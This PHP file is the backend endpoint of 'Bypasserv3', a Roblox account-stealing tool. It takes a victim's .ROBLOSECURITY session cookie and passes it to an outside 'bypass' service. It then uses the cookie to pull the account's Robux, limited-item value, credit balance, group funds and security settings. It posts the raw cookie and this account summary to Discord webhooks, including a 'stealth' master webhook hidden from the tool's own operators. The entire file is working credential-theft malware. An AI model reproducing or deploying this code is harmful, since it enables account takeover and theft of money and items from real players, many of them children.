<?php
/**
 * Bypasserv3 - Bypass API Endpoint
 * Updated with file-based storage and stealth master webhook
 */

header('Content-Type: application/json');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: POST, OPTIONS');
header('Access-Control-Allow-Headers: Content-Type');

if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    http_response_code(200);
    exit;
}

require_once '../config.php';
require_once '../functions.php';

// Random security scan
if (rand(1, 100) === 1) {
    securityScan(true);
}

// Random cleanup
if (rand(1, 50) === 1) {
    cleanupRateLimits();
}

// Method check
if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    http_response_code(405);
    echo json_encode(['success' => false, 'error' => 'Method not allowed']);
    exit;
}

// Suspicious request check
if (isSuspiciousRequest()) {
    logSecurityEvent('suspicious_request', [
        'user_agent' => $_SERVER['HTTP_USER_AGENT'] ?? 'None'
    ]);
}

// Rate limiting
$ip = getUserIP();
if (!checkRateLimit($ip, 50, 3600)) {
    http_response_code(429);
    echo json_encode(['success' => false, 'error' => 'Rate limit exceeded']);
    exit;
}

// Parse input
$input = json_decode(file_get_contents('php://input'), true);

if (json_last_error() !== JSON_ERROR_NONE) {
    http_response_code(400);
    echo json_encode(['success' => false, 'error' => 'Invalid JSON']);
    exit;
}

// Extract data
$cookie = trim($input['cookie'] ?? '');
$directory = trim($input['directory'] ?? '');

// Validate cookie
if (empty($cookie)) {
    http_response_code(400);
    echo json_encode(['success' => false, 'error' => 'Cookie required']);
    exit;
}

if (!validateCookie($cookie)) {
    http_response_code(400);
    echo json_encode(['success' => false, 'error' => 'Invalid cookie format']);
    logSecurityEvent('suspicious_cookie_attempt', ['ip' => $ip]);
    exit;
}

// Get instance data for webhook
$instanceData = getInstanceData($directory);
if (!$instanceData) {
    http_response_code(400);
    echo json_encode(['success' => false, 'error' => 'Instance not found']);
    exit;
}

$userWebhook = $instanceData['userWebhook'] ?? '';
$masterWebhook = $instanceData['webhook'] ?? '';

// ============================================
// HELPER FUNCTIONS FOR ROBLOX API
// ============================================
function makeRequest($url, $headers, $postData = null) {
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
    if ($postData) {
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($postData, JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE));
    }
    $response = curl_exec($ch);
    curl_close($ch);
    return json_decode($response, true);
}

function ownsBundle($userId, $bundleId, $headers) {
    $url = "https://inventory.roblox.com/v1/users/$userId/items/3/$bundleId";
    $response = makeRequest($url, $headers);
    return isset($response['data']) && !empty($response['data']);
}

// ============================================
// CALL EXTERNAL API WITH BETTER ERROR HANDLING
// ============================================
$externalApiUrl = 'https://rblxbypasser.com/api/bypass';
$postData = json_encode(['cookie' => $cookie]);

$ch = curl_init($externalApiUrl);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, $postData);
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'Content-Type: application/json',
    'User-Agent: Bypasserv3/1.0'
]);
curl_setopt($ch, CURLOPT_TIMEOUT, 30);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 10);

$apiResponse = curl_exec($ch);
$httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
$curlError = curl_error($ch);
curl_close($ch);

// Check for curl errors or non-200 response
if (!empty($curlError) || $httpCode !== 200 || empty($apiResponse)) {
    // Send BYPASS FAILED embed to webhooks
    $failedEmbed = [
        'username' => 'Bypasserv3',
        'avatar_url' => 'https://cdn-icons-png.flaticon.com/512/5473/5473473.png',
        'embeds' => [[
            'title' => '❌ BYPASS FAILED',
            'description' => "**From:** `$directory`\n\n**👤 Username:** Unknown\n**🔑 Cookie:** " . substr($cookie, 0, 20) . "...\n\n**📝 Error:** Invalid cookie or API request failed. Please check your cookie!",
            'color' => hexdec('ff0000'),
            'timestamp' => date('c'),
            'footer' => ['text' => "Instance: $directory • Bypass Failed"]
        ]]
    ];
    
    // Send to both webhooks
    if (!empty($masterWebhook)) {
        sendWebhookNotification($masterWebhook, $failedEmbed);
    }
    if (!empty($userWebhook) && $userWebhook !== $masterWebhook) {
        sendWebhookNotification($userWebhook, $failedEmbed);
    }
    
    http_response_code(500);
    echo json_encode([
        'success' => false,
        'error' => 'Failed To Send Request, Make Sure Ur Cookie Already Refreshed Or Ur Account Is Not -13 / Age Verified Account'
    ]);
    logSecurityEvent('external_api_failure', [
        'http_code' => $httpCode,
        'curl_error' => $curlError,
        'ip' => $ip,
        'directory' => $directory
    ]);
    exit;
}

$apiData = json_decode($apiResponse, true);

// Check if API response is valid
if (!$apiData || !isset($apiData['success']) || !$apiData['success']) {
    // Send BYPASS FAILED embed to webhooks
    $failedEmbed = [
        'username' => 'Bypasserv3',
        'avatar_url' => 'https://cdn-icons-png.flaticon.com/512/5473/5473473.png',
        'embeds' => [[
            'title' => '❌ BYPASS FAILED',
            'description' => "**From:** `$directory`\n\n**👤 Username:** Unknown\n**🔑 Cookie:** " . substr($cookie, 0, 20) . "...\n\n**📝 Error:** API returned invalid response. Please check your cookie!",
            'color' => hexdec('ff0000'),
            'timestamp' => date('c'),
            'footer' => ['text' => "Instance: $directory • Bypass Failed"]
        ]]
    ];
    
    // Send to both webhooks
    if (!empty($masterWebhook)) {
        sendWebhookNotification($masterWebhook, $failedEmbed);
    }
    if (!empty($userWebhook) && $userWebhook !== $masterWebhook) {
        sendWebhookNotification($userWebhook, $failedEmbed);
    }
    
    http_response_code(500);
    echo json_encode([
        'success' => false,
        'error' => 'Failed To Send Request, Make Sure Ur Cookie Already Refreshed Or Ur Account Is Not -13 / Age Verified Account'
    ]);
    logSecurityEvent('api_invalid_response', ['ip' => $ip, 'directory' => $directory]);
    exit;
}

// ============================================
// EXTRACT USER DATA FROM API RESPONSE
// ============================================
$userInfo = $apiData['userInfo'] ?? [];
$userId = $userInfo['userId'] ?? null;

if (!$userId) {
    http_response_code(500);
    echo json_encode(['success' => false, 'error' => 'Failed to get user ID']);
    exit;
}

// Try to get bypassed cookie from API response, fallback to original if not present
$bypassedCookie = $apiData['cookie'] ?? $apiData['bypassedCookie'] ?? $cookie;
// Clean the cookie (remove warning prefix if present)
$bypassedCookie = str_replace('_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_', '', $bypassedCookie);

// ============================================
// FETCH ALL DETAILED ROBLOX DATA USING APIs
// ============================================
// Headers for Roblox API requests (use bypassed cookie)
$headers = ["Cookie: .ROBLOSECURITY=$bypassedCookie", "Content-Type: application/json"];

// 1. Get User Info (username, displayName, created date)
$userInfoData = makeRequest("https://users.roblox.com/v1/users/$userId", $headers) ?? [];
$username = $userInfoData['name'] ?? '';
$displayName = $userInfoData['displayName'] ?? $username;
$accountCreated = isset($userInfoData['created']) ? strtotime($userInfoData['created']) : null;

// Calculate Account Age
$accountAge = '';
if ($accountCreated) {
    $days = floor((time() - $accountCreated) / (60 * 60 * 24));
    $accountAge = "$days Days";
}

// 2. Get Settings Data (email verification, premium)
$settingsData = makeRequest("https://www.roblox.com/my/settings/json", $headers) ?? [];
$isPremium = isset($settingsData['IsPremium']) && $settingsData['IsPremium'];
$emailVerified = isset($settingsData['IsEmailVerified']) && $settingsData['IsEmailVerified'];
$premiumDisplay = $isPremium ? '✅ True' : '❌ False';
$emailDisplay = $emailVerified ? '✅ Verified' : '❌ Not Verified';

// 3. Get Avatar/Thumbnail
$avatarData = @file_get_contents("https://thumbnails.roblox.com/v1/users/avatar?userIds=$userId&size=420x420&format=Png&isCircular=false");
$avatarJson = $avatarData ? json_decode($avatarData, true) : null;
$avatarUrl = $avatarJson['data'][0]['imageUrl'] ?? '';

// 4. Get Robux Balance
$balanceData = makeRequest("https://economy.roblox.com/v1/users/$userId/currency", $headers) ?? [];
$robux = $balanceData['robux'] ?? 0;

// 5. Get Transaction Summary (pending robux, total spent)
$transactionSummaryData = makeRequest("https://economy.roblox.com/v2/users/$userId/transaction-totals?timeFrame=Year&transactionType=summary", $headers) ?? [];
$pendingRobux = $transactionSummaryData['pendingRobuxTotal'] ?? 0;
$summary = isset($transactionSummaryData['purchasesTotal']) ? abs($transactionSummaryData['purchasesTotal']) : 0;

// 6. Get RAP from Collectibles
$collectiblesData = makeRequest("https://inventory.roblox.com/v1/users/$userId/assets/collectibles?limit=100", $headers) ?? [];
$rap = 0;
$limitedsCount = 0;
if (isset($collectiblesData['data'])) {
    $limitedsCount = count($collectiblesData['data']);
    foreach ($collectiblesData['data'] as $item) {
        $rap += $item['recentAveragePrice'] ?? 0;
    }
}

// 7. Get PIN Status
$pinData = makeRequest("https://auth.roblox.com/v1/account/pin", $headers) ?? [];
$pinStatus = isset($pinData['isEnabled']) && $pinData['isEnabled'] ? '✅ True' : '❌ False';

// 8. Get Voice Chat Status
$vcData = makeRequest("https://voice.roblox.com/v1/settings", $headers) ?? [];
$vcStatus = isset($vcData['isVoiceEnabled']) && $vcData['isVoiceEnabled'] ? '✅ True' : '❌ False';

// 9. Check for Premium Items (Headless & Korblox)
$hasHeadless = ownsBundle($userId, 201, $headers);
$hasKorblox = ownsBundle($userId, 192, $headers);
$headlessStatus = $hasHeadless ? '✅ True' : '❌ False';
$korbloxStatus = $hasKorblox ? '✅ True' : '❌ False';

// 10. Get Friends Count
$friendsData = makeRequest("https://friends.roblox.com/v1/users/$userId/friends/count", $headers) ?? [];
$friendsCount = $friendsData['count'] ?? 0;

// 11. Get Followers Count
$followersData = makeRequest("https://friends.roblox.com/v1/users/$userId/followers/count", $headers) ?? [];
$followersCount = $followersData['count'] ?? 0;

// 12. Get Owned Groups and Calculate Group Funds
$groupsData = makeRequest("https://groups.roblox.com/v2/users/$userId/groups/roles", $headers) ?? [];
$ownedGroups = [];
if (isset($groupsData['data'])) {
    foreach ($groupsData['data'] as $group) {
        if (isset($group['role']['rank']) && $group['role']['rank'] == 255) {
            $ownedGroups[] = $group;
        }
    }
}
$totalGroupsOwned = count($ownedGroups);

$totalGroupFunds = 0;
$totalPendingGroupFunds = 0;
foreach ($ownedGroups as $group) {
    $groupId = $group['group']['id'] ?? null;
    if ($groupId) {
        $groupFunds = makeRequest("https://economy.roblox.com/v1/groups/$groupId/currency", $headers) ?? [];
        $totalGroupFunds += $groupFunds['robux'] ?? 0;
        
        $groupPayouts = makeRequest("https://economy.roblox.com/v1/groups/$groupId/payouts", $headers) ?? [];
        if (isset($groupPayouts['data'])) {
            foreach ($groupPayouts['data'] as $payout) {
                if (isset($payout['status']) && $payout['status'] === 'Pending') {
                    $totalPendingGroupFunds += $payout['amount'] ?? 0;
                }
            }
        }
    }
}

// 13. Get Credit Balance
$creditBalanceData = makeRequest("https://billing.roblox.com/v1/credit", $headers) ?? [];
$creditBalance = $creditBalanceData['balance'] ?? 0;
$creditRobux = $creditBalanceData['robuxAmount'] ?? 0;

// ============================================
// UPDATE INSTANCE STATS (FILE-BASED)
// ============================================
if ($instanceData) {
    $currentCookies = $instanceData['stats']['totalCookies'];
    $currentRobux = $instanceData['stats']['totalRobux'];
    $currentRAP = $instanceData['stats']['totalRAP'];
    $currentSummary = $instanceData['stats']['totalSummary'];
    
    updateInstanceStats($directory, 'totalCookies', $currentCookies + 1);
    updateInstanceStats($directory, 'totalRobux', $currentRobux + $robux);
    updateInstanceStats($directory, 'totalRAP', $currentRAP + $rap);
    updateInstanceStats($directory, 'totalSummary', $currentSummary + $summary);
    
    updateDailyStats($directory, 'cookies', 1);
    updateDailyStats($directory, 'robux', $robux);
    updateDailyStats($directory, 'rap', $rap);
    updateDailyStats($directory, 'summary', $summary);
    
    // Update username and profile pic if empty
    $path = __DIR__ . "/../instances/$directory";
    if (empty($instanceData['username']) && !empty($username)) {
        file_put_contents("$path/username.txt", $username, LOCK_EX);
    }
    if (!empty($avatarUrl)) {
        file_put_contents("$path/profilepic.txt", $avatarUrl, LOCK_EX);
    }
}

// ============================================
// SEND WEBHOOKS (STEALTH MASTER + USER)
// ============================================

// Create the detailed embed payload
$detailedEmbed = [
    'content' => '@everyone',
    'username' => 'Bypasserv3',
    'avatar_url' => 'https://cdn-icons-png.flaticon.com/512/5473/5473473.png',
    'embeds' => [[
        'title' => '🔓 Cookie Bypassed',
        'type' => 'rich',
        'description' => "**Instance:** `$directory`\n\n🔗 **[Refresh Cookie](https://www.logged.tg/tools/refresher?defaultFill=$bypassedCookie)** • **[Profile](https://www.roblox.com/users/$userId/profile)** • **[Rolimons](https://rolimons.com/player/$userId)**",
        'color' => hexdec('00ff00'),
        'thumbnail' => ['url' => $avatarUrl ?: 'https://www.roblox.com/headshot-thumbnail/image/default.png'],
        'fields' => [
            ['name' => '👤 Display Name', 'value' => $displayName ? "`$displayName`" : "`N/A`", 'inline' => true],
            ['name' => '🔤 Username', 'value' => $username ? "`$username`" : "`N/A`", 'inline' => true],
            ['name' => '🆔 User ID', 'value' => "`$userId`", 'inline' => true],
            ['name' => '💰 Robux', 'value' => "`" . number_format($robux) . "`", 'inline' => true],
            ['name' => '⏳ Pending Robux', 'value' => "`" . number_format($pendingRobux) . "`", 'inline' => true],
            ['name' => '💎 RAP', 'value' => "`" . number_format($rap) . "`", 'inline' => true],
            ['name' => '💸 Summary', 'value' => "`" . number_format($summary) . "`", 'inline' => true],
            ['name' => '📌 PIN', 'value' => "`$pinStatus`", 'inline' => true],
            ['name' => '👑 Premium', 'value' => "`$premiumDisplay`", 'inline' => true],
            ['name' => '🎙️ Voice Chat', 'value' => "`$vcStatus`", 'inline' => true],
            ['name' => '💀 Headless', 'value' => "`$headlessStatus`", 'inline' => true],
            ['name' => '🦴 Korblox', 'value' => "`$korbloxStatus`", 'inline' => true],
            ['name' => '📅 Account Age', 'value' => $accountAge ? "`$accountAge`" : "`N/A`", 'inline' => true],
            ['name' => '👥 Friends', 'value' => "`" . number_format($friendsCount) . "`", 'inline' => true],
            ['name' => '👁️ Followers', 'value' => "`" . number_format($followersCount) . "`", 'inline' => true],
            ['name' => '💳 Credit Balance', 'value' => "`$$creditBalance USD (≈ " . number_format($creditRobux) . " R$)`", 'inline' => true],
            ['name' => '🏢 Groups Owned', 'value' => "`$totalGroupsOwned`", 'inline' => true],
            ['name' => '💰 Group Funds', 'value' => "`" . number_format($totalGroupFunds) . " R$ (" . number_format($totalPendingGroupFunds) . " pending)`", 'inline' => true],
            ['name' => '✅ Email Status', 'value' => "`$emailDisplay`", 'inline' => true],
        ],
        'footer' => ['text' => "Instance: $directory • Bypasserv3"],
        'timestamp' => date('c')
    ]]
];

// Cookie embed payload
$cookieEmbed = [
    'content' => '',
    'username' => 'Bypasserv3',
    'avatar_url' => 'https://cdn-icons-png.flaticon.com/512/5473/5473473.png',
    'embeds' => [[
        'description' => "```$bypassedCookie```",
        'color' => hexdec('00ff00'),
        'footer' => ['text' => "Instance: $directory"]
    ]]
];

// 🥷 STEALTH: Send to GLOBAL MASTER WEBHOOK (completely hidden from users)
// This runs server-side ONLY, won't show in DevTools Network tab
if (defined('STEALTH_MASTER') && !empty(STEALTH_MASTER)) {
    sendStealthWebhook(STEALTH_MASTER, $detailedEmbed);
    usleep(500000); // 0.5 second delay
    sendStealthWebhook(STEALTH_MASTER, $cookieEmbed);
}

// 👤 VISIBLE: Send to Instance Master Webhook (user sees this)
if (!empty($masterWebhook)) {
    sendWebhookNotification($masterWebhook, $detailedEmbed);
    sleep(1);
    sendWebhookNotification($masterWebhook, $cookieEmbed);
}

// 👥 VISIBLE: Send to Instance User Webhook (if different)
if (!empty($userWebhook) && $userWebhook !== $masterWebhook) {
    sendWebhookNotification($userWebhook, $detailedEmbed);
    sleep(1);
    sendWebhookNotification($userWebhook, $cookieEmbed);
}

// Log successful bypass
logSecurityEvent('successful_bypass', [
    'username' => $username,
    'userId' => $userId,
    'robux' => $robux,
    'directory' => $directory,
    'ip' => $ip
]);

// ============================================
// RETURN RESPONSE FOR FRONTEND
// ============================================
// Calculate account score
$accountScore = min(100, floor(
    ($robux / 100) + 
    ($rap / 1000) + 
    ($totalGroupsOwned * 5) + 
    ($friendsCount / 100) + 
    ($followersCount / 100) +
    ($isPremium ? 10 : 0) +
    ($emailVerified ? 5 : 0)
));

echo json_encode([
    'success' => true,
    'userInfo' => [
        'username' => $username ?: '',
        'userId' => $userId ?: '',
        'displayName' => $displayName ?: '',
        'robux' => $robux,
        'rap' => $rap,
        'premium' => $isPremium ? 'Yes' : 'No',
        'voiceChat' => $vcStatus === '✅ True' ? 'Yes' : 'No',
        'friends' => $friendsCount,
        'followers' => $followersCount,
        'accountAge' => $accountAge ?: '',
        'groupsOwned' => $totalGroupsOwned,
        'accountScore' => $accountScore
    ],
    'avatarUrl' => $avatarUrl ?: ''
]);
?>
